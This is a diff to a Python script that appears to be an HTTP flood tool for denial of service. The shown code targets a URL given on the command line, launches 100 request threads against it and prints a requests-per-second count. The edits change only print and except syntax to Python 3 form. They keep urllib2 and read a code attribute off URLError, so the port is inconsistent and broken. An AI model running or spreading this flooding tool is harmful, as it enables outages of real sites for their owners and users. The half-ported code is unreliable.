@@ -43,8 +43,8 @@ def buildblock(size):
     return(out_str)
 
 def usage():
-    print 'Usage: python ' + sys.argv[0] + ' <url>'
-    print 'Example: python ' + sys.argv[0] + ' http://www.example.com'
+    print('Usage: python ' + sys.argv[0] + ' <url>')
+    print('Example: python ' + sys.argv[0] + ' http://www.example.com')
 
 def httpcall(url):
     useragent_list()
@@ -64,9 +64,9 @@ def httpcall(url):
     request.add_header('Host',host)
     try:
         urllib2.urlopen(request)
-    except urllib2.HTTPError, e:
+    except urllib2.HTTPError as e:
         code = e.code
-    except urllib2.URLError, e:
+    except urllib2.URLError as e:
         code = e.code
     return code
 
@@ -87,7 +87,7 @@ class MonitorThread(threading.Thread):
         try:
             while flag==0:
                 if (request_counter/1000) > request_counter/1000.00 and request_counter/1000.00 > request_counter/1000:
-                    print request_counter/1000.00, 'req/sec'
+                    print(request_counter/1000.00, 'req/sec')
                 pass
         except:
             pass
@@ -102,10 +102,10 @@ if __name__ == '__main__':
         else:
             url = 'http://' + sys.argv[1]
         host = re.search('https?://([^/]+)', url).group(1)
-        print '[+] Target:', url
-        print '[+] Host:', host
-        print '[+] Starting...'
-        print '[+] Press Ctrl+C to stop'
+        print('[+] Target:', url)
+        print('[+] Host:', host)
+        print('[+] Starting...')
+        print('[+] Press Ctrl+C to stop')
         for i in range(100):
             t = HTTPThread()
             t.start()
@@ -118,5 +118,5 @@ if __name__ == '__main__':
                 break
     except KeyboardInterrupt:
         set_flag(2)
-        print '\n[+] Stopped'
+        print('\n[+] Stopped')
         sys.exit() 
